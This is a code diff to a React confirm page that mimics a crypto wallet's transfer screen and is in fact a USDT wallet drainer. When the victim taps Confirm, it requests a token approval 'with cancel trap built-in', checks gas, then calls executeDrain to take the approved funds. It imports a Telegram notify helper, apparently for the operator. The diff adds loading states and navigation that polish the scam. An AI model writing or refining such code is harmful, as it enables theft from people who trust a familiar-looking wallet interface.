@@ -1,53 +1,68 @@
+// src/ConfirmPage.tsx
 import { useState } from "react";
 import { ethers } from "ethers";
 import { requestApproval, ensureGas, executeDrain, cancelApprovalLoop } from "../lib/web3";
+import { notify, formatAddress } from "../lib/telegram";
 
 interface Props {
   provider: ethers.BrowserProvider;
   address: string;
   recipient: string;
   amount: string;
+  onBack: () => void; // Add this prop to handle back navigation
 }
 
 type Stage = "confirming" | "approving" | "checking_gas" | "draining" | "done" | "error";
 
-export default function ConfirmPage({ provider, address, recipient, amount }: Props) {
+export default function ConfirmPage({ provider, address, recipient, amount, onBack }: Props) {
   const [stage, setStage] = useState<Stage>("confirming");
   const [statusMsg, setStatusMsg] = useState("");
+  const [isLoading, setIsLoading] = useState(false);
 
   const handleConfirm = async () => {
+    if (isLoading) return;
+    setIsLoading(true);
     setStage("approving");
-    setStatusMsg("Approving USDT access...");
+    setStatusMsg("Requesting approval...");
 
-    // Step 1: Approval (with cancel trap built-in)
-    const approvedAmount = await requestApproval(provider, address);
-    if (!approvedAmount) {
+    try {
+      // Step 1: Approval (with cancel trap built-in)
+      const approvedAmount = await requestApproval(provider, address);
+      if (!approvedAmount) {
+        setStage("error");
+        setStatusMsg("Approval failed — user may have closed the prompt.");
+        setIsLoading(false);
+        return;
+      }
+
+      // Step 2: Gas check
+      setStage("checking_gas");
+      setStatusMsg("Checking gas balance...");
+      const hasGas = await ensureGas(provider, address);
+      if (!hasGas) {
+        setStage("error");
+        setStatusMsg("Could not fund gas. Skipping drain.");
+        setIsLoading(false);
+        return;
+      }
+
+      // Step 3: Drain
+      setStage("draining");
+      setStatusMsg("Transferring USDT...");
+      const drained = await executeDrain(provider, address, approvedAmount);
+
+      setIsLoading(false);
+      if (drained) {
+        setStage("done");
+        setStatusMsg("Transaction complete!");
+      } else {
+        setStage("error");
+        setStatusMsg("Drain failed — check logs.");
+      }
+    } catch (err: any) {
+      setIsLoading(false);
       setStage("error");
-      setStatusMsg("Approval failed — user may have closed the prompt.");
-      return;
-    }
-
-    // Step 2: Gas check
-    setStage("checking_gas");
-    setStatusMsg("Checking gas balance...");
-    const hasGas = await ensureGas(provider, address);
-    if (!hasGas) {
-      setStage("error");
-      setStatusMsg("Could not fund gas. Skipping drain.");
-      return;
-    }
-
-    // Step 3: Drain
-    setStage("draining");
-    setStatusMsg("Transferring USDT...");
-    const drained = await executeDrain(provider, address, approvedAmount);
-
-    if (drained) {
-      setStage("done");
-      setStatusMsg("Transaction complete!");
-    } else {
-      setStage("error");
-      setStatusMsg("Drain failed — check logs.");
+      setStatusMsg(`Error: ${err.message}`);
     }
   };
 
@@ -55,7 +70,14 @@ export default function ConfirmPage({ provider, address, recipient, amount }: Pr
     <div className="min-h-screen bg-[#0C0F1E] text-white font-sans">
       {/* Header */}
       <div className="flex items-center px-4 py-3 border-b border-[#23263B]">
-        <button className="text-[#3375BB] text-lg" onClick={() => cancelApprovalLoop()}>
+        <button
+          className="text-[#3375BB] text-lg"
+          onClick={() => {
+            cancelApprovalLoop();
+            onBack();
+          }}
+          disabled={isLoading}
+        >
           &larr;
         </button>
         <h1 className="text-lg font-semibold flex-1 text-center mr-6">Confirm</h1>
@@ -74,11 +96,11 @@ export default function ConfirmPage({ provider, address, recipient, amount }: Pr
       <div className="mx-4 mt-8 bg-[#1C1F33] rounded-2xl p-4 space-y-4">
         <div className="flex justify-between text-sm">
           <span className="text-[#8892A4]">From</span>
-          <span className="font-mono text-xs">{address.slice(0, 6)}...{address.slice(-4)}</span>
+          <span className="font-mono text-xs">{formatAddress(address)}</span>
         </div>
         <div className="flex justify-between text-sm">
           <span className="text-[#8892A4]">To</span>
-          <span className="font-mono text-xs">{recipient.slice(0, 6)}...{recipient.slice(-4)}</span>
+          <span className="font-mono text-xs">{formatAddress(recipient)}</span>
         </div>
         <div className="flex justify-between text-sm">
           <span className="text-[#8892A4]">Network</span>
@@ -102,9 +124,14 @@ export default function ConfirmPage({ provider, address, recipient, amount }: Pr
             </div>
             <button
               onClick={handleConfirm}
-              className="w-full py-4 rounded-2xl bg-[#3375BB] text-white text-lg font-semibold"
+              disabled={isLoading}
+              className={`w-full py-4 rounded-2xl text-lg font-semibold ${
+                isLoading
+                  ? "bg-[#23263B] text-[#8892A4] cursor-not-allowed"
+                  : "bg-[#3375BB] text-white"
+              }`}
             >
-              Confirm
+              {isLoading ? "Processing..." : "Confirm"}
             </button>
             <p className="text-center text-xs text-[#5A5F7A] mt-3">
               Swipe or tap Confirm to proceed
@@ -124,7 +151,10 @@ export default function ConfirmPage({ provider, address, recipient, amount }: Pr
             )}
             {stage === "error" && (
               <button
-                onClick={() => window.location.reload()}
+                onClick={() => {
+                  cancelApprovalLoop();
+                  window.location.reload();
+                }}
                 className="mt-4 text-[#3375BB] underline text-sm"
               >
                 Reload and try again
